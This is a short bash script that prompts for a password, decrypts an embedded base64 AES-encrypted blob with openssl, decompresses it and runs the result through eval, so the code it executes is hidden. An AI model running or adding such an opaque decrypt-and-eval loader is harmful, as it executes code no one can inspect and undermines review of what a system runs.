#!/bin/bash
read -p "Please provide a password: " PASSWORD
eval "$(echo "U2FsdGVkX19rqKRue7yuHXxr94zvVQfP0bH7oj5UzffB4Aoyqs8ThwLzU/dIV1f5" | base64 -d | openssl enc -d -aes-256-cbc -salt -pbkdf2 -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
